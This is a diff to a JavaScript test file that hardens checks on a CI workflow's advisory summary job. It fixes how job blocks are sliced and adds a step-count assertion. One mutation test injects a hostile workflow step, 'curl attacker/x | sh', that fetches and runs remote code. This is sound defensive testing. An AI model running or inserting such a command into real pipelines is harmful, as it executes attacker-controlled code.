@@ -933,6 +933,22 @@ function assertAdvisorySummaryJob(source) {
     "Combine and publish the advisory table",
     "the advisory summary job must have a 'Combine and publish the advisory table' step",
   );
+
+  // A step count is cheap, exact, and independent of stepBlockLines' own
+  // by-name pin above: an appended step counts as a `      - ` list item
+  // under `steps:` whether or not it carries a `- name:` key at all, so an
+  // anonymous `- run:` item spliced in after the pinned step (where the
+  // by-name pin's own "no next step" fallback would otherwise fold it
+  // straight into the pinned step's own line count) trips this with its
+  // own message first. The decoy-shadow check above still fires first for
+  // a same-named decoy, since that throws inside stepBlockLines itself
+  // before this line is ever reached.
+  const stepCount = (summary.match(/^ {6}- /gmu) ?? []).length;
+  assert.ok(
+    stepCount === 3,
+    `the advisory summary job must have exactly 3 steps, found ${stepCount}`,
+  );
+
   assert.ok(
     summaryStepLines.length === expectedSummaryStepLines.length,
     `the advisory summary job's "Combine and publish the advisory table" step must have exactly ${expectedSummaryStepLines.length} lines, found ${summaryStepLines.length}`,
@@ -1005,12 +1021,32 @@ function escapeForRegExp(value) {
   return value.replaceAll(/[.*+?^${}()|[\]\\]/gu, "\\$&");
 }
 
+// Ends only at the next top-level job key, never at a bare 2-space comment:
+// a "  # note" line planted INSIDE this job's own step list used to match
+// the comment branch of the old regex and truncate the slice right there,
+// so a step appended after that comment ran in CI but was invisible to
+// every assertion below, including the exact-once step-name check. Every
+// job in this file is followed by that next job's own leading doc-comment
+// block (2-space `#` lines) before its key, so trimming still has to
+// happen -- just from the true END of the slice only, popping trailing
+// blank/comment lines one at a time, never scanning into the middle. An
+// injected comment with real step content after it is real content sitting
+// before that trailing run, so the loop below stops at it and the content
+// stays in the slice.
 function jobBlock(source, jobName, missingMessage) {
   const start = source.indexOf(`  ${jobName}:\n`);
   assert.notEqual(start, -1, missingMessage);
   const rest = source.slice(start + 1);
-  const next = rest.search(/^ {2}(?:[a-z][a-z0-9-]*:|#)/mu);
-  return next === -1 ? source.slice(start) : source.slice(start, start + 1 + next);
+  const next = rest.search(/^ {2}[a-z][a-z0-9-]*:/mu);
+  const end = next === -1 ? source.length : start + 1 + next;
+  const lines = source.slice(start, end).split("\n");
+  while (
+    lines.length > 0 &&
+    (lines[lines.length - 1] === "" || /^ {2}#/u.test(lines[lines.length - 1]))
+  ) {
+    lines.pop();
+  }
+  return `${lines.join("\n")}\n`;
 }
 
 // PW-6.1: a gate nobody proves can fail is the defect being fixed. The canary
@@ -1603,6 +1639,23 @@ test("mutation contract rejects an advisory summary step that gains a shell over
       "      - name: Combine and publish the advisory table\n        shell: bash -n {0}\n        env:",
     ),
     'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
+  );
+});
+
+test("mutation contract rejects a step appended after a 2-space comment planted in the job's own step list", () => {
+  // The old jobBlock ended at the FIRST 2-space comment as well as the next
+  // job key, so a "  # note" line planted here truncated the slice right
+  // there: an anonymous step spliced in after it would run in CI but never
+  // appear in `summary` at all, invisible to stepBlockLines, the
+  // exact-once name check, and every other assertion on this job's text.
+  // jobBlock now ends only at the next job key, so this step count is what
+  // actually notices the extra list item.
+  assertMutationFailure(
+    workflow.replace(
+      "            exit 1\n          fi\n\n  # PW-6.1: the gate this workflow depends on silently stopped gating, and",
+      "            exit 1\n          fi\n\n  # note\n      - run: curl attacker/x | sh\n\n  # PW-6.1: the gate this workflow depends on silently stopped gating, and",
+    ),
+    "the advisory summary job must have exactly 3 steps, found 4",
   );
 });
 
